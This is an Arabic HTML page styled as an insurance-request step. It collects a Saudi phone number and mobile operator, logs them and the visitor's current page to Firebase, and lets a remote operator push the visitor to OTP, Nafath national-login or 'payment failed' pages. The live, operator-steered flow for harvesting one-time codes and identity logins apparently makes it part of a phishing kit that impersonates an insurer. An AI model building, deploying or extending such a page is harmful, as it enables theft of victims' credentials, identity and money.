<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>استكمال الطلب | Complete Request</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <style>
        body { display:flex; flex-direction:column; min-height:100vh; }
        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<nav class="inner-nav">
    <a href="index.html" class="inner-nav__logo">tree</a>
    <div class="inner-nav__right">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>
</nav>

<div class="main-wrap">
    <div class="teal-card teal-card--narrow" style="width:100%;">
        <div class="card-head">
            <div class="section-title" data-i18n="mobile.title">تأكيد رقم هاتف مقدم الطلب</div>
        </div>
        <div class="card-body">

            <div class="alert-teal" data-i18n="mobile.alert">لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.</div>

            <form onsubmit="submitRequest(event)">

                <!-- رقم الجوال -->
                <div class="field">
                    <label class="field__label" for="phoneNumber" data-i18n="mobile.phone_label">رقم الجوال *</label>
                    <div class="phone-wrap">
                        <div class="phone-prefix">
                            <span>🇸🇦</span>
                            <span>+966</span>
                            <span style="opacity:.25;margin-inline-start:2px;">|</span>
                        </div>
                        <input type="tel" class="field__input" id="phoneNumber" placeholder="5xxxxxxxx" dir="ltr" oninput="forceEnglish(this)" maxlength="9" required pattern="\d{9,}">
                    </div>
                </div>

                <!-- مشغل الشبكة -->
                <div class="field">
                    <label class="field__label" data-i18n="mobile.operator_title">مشغل شبكة الجوال *</label>
                    <div class="operator-grid">
                        <div class="operator-card-wrap">
                            <input type="radio" name="networkOperator" id="op_stc" value="stc" required>
                            <label class="operator-card-label" for="op_stc">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/STC_Logo.svg" alt="STC">
                                <span>STC</span>
                            </label>
                        </div>
                        <div class="operator-card-wrap">
                            <input type="radio" name="networkOperator" id="op_mobily" value="mobily">
                            <label class="operator-card-label" for="op_mobily">
                                <img src="https://upload.wikimedia.org/wikipedia/en/e/e7/Mobily_Logo.svg" alt="Mobily">
                                <span>Mobily</span>
                            </label>
                        </div>
                        <div class="operator-card-wrap">
                            <input type="radio" name="networkOperator" id="op_zain" value="zain">
                            <label class="operator-card-label" for="op_zain">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Zain-logo.svg" alt="Zain">
                                <span>Zain</span>
                            </label>
                        </div>
                    </div>
                </div>

                <button type="submit" class="btn-green" data-i18n="mobile.btn_register">تسجيل</button>
            </form>
        </div>
    </div>
</div>

<script>
    function forceEnglish(el) {
        el.value = el.value.replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d)).replace(/[^0-9]/g, '');
    }

    async function submitRequest(event) {
        event.preventDefault();
        const phone = document.getElementById('phoneNumber').value;
        const operator = document.querySelector('input[name="networkOperator"]:checked')?.value || 'Unknown';
        if (window.saveOperator) await window.saveOperator(phone, operator);
        window.location.href = `mobile_verification.html?phone=${encodeURIComponent(phone)}`;
    }
</script>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const userId = localStorage.getItem('user_id');

    if (userId) {
        updateDoc(doc(db, "requests", userId), { currentPage: 'استكمال الجوال' }).catch(() => {});

        window.saveOperator = async (ph, op) => {
            await updateDoc(doc(db, "requests", userId), { mobileNumberConfirmed: ph, networkOperator: op });
        };

        onSnapshot(doc(db, "orders", userId), (orderSnap) => {
            const data = orderSnap.data();
            if (!data) return;
            if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
            else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
            else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
        });
    }
</script>
</body>
</html>
